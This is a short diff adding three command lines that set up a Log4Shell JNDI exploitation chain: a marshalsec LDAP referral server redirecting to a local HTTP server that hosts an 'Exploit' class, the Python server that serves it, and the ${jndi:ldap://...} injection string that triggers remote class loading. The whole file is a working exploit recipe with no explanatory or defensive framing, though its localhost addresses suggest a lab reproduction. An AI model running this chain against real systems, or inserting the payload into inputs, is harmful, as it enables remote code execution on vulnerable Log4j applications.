@@ -1,0 +1,3 @@
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8080/#Exploit" 8888
+python -m http.server 8080
+${jndi:ldap://127.0.0.1:8888/Exploit}
